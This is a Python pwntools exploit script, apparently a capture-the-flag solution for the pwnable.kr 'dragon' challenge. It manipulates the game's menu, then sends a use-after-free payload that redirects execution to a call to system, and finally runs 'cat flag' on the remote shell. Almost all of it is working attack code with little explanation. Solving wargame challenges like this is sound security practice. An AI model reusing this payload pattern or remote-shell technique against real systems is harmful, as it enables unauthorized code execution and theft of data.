from pwn import *
import argh


ADDR = 'pwnable.kr'
PORT = 9004


def start_gdb(exe_name):
    return gdb.debug([exe_name], '''
    b *0x8048917
    layout regs
    continue
    ''')


@argh.arg('--local', '-l', help='Run Locally')
@argh.arg('--runpwn', '-r', help='Run Remotly')
def main(local=False, runpwn=False):
    p = None
    bin_path = './dragon'
    e = ELF(bin_path)
    call_to_system = 0x8048dbf

    if local:
        p = start_gdb(bin_path)
    elif runpwn:
        p = remote(ADDR, PORT)

    p.recvuntil('[ 2 ] Knight\n')
    ################################
    # this will kill us the fastest
    ################################
    p.sendline('2') # select the knight
    p.sendline('2') # die fast
    ################################
    # now we win
    ################################
    p.sendline('1') # select the priest
    for _ in xrange(4):
        p.sendline('3')  # be invincable
        p.sendline('3')  # be invincable
        p.sendline('2')  # get mana back

    ################################
    # this exploits a UAF vuln
    ################################
    p.sendline(p32(call_to_system) + 'A' * 12)
    p.recvuntil('Was Called:\n')
    p.sendline('cat flag')
    print(p.recvline())


if __name__ == '__main__':
    argh.dispatch_command(main)

